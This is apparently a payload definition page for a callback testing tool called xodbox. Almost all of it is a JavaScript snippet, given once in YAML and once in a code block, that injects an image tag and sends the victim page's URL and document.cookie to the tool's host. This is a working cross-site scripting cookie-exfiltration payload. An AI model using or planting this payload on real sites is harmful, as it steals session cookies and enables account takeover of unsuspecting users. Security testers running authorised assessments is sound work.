---
title: Javascript
description: Returns JS that embeds an image back to xodbox
weight: 1
payloads:
  - type: HTTPX
    project_id: 1
    sort_order: 1
    pattern: /js$
    data: '{"headers":{"Content-Type":"text/javascript"},"body":"(function (){\nvar s = document.createElement(\"img\");\ndocument.body.appendChild(s);\n
    s.src=\"//{{ .Host }}/jscb?src=\"+window.location+\"&c=\"+document.cookie;})()"}'
---

Simple JS Payload

```javascript
(function (){
    var s = document.createElement("img");
    document.body.appendChild(s);
    s.src="//{{ .Host }}/jscb?src="+window.location+"&c="+document.cookie;
})()

```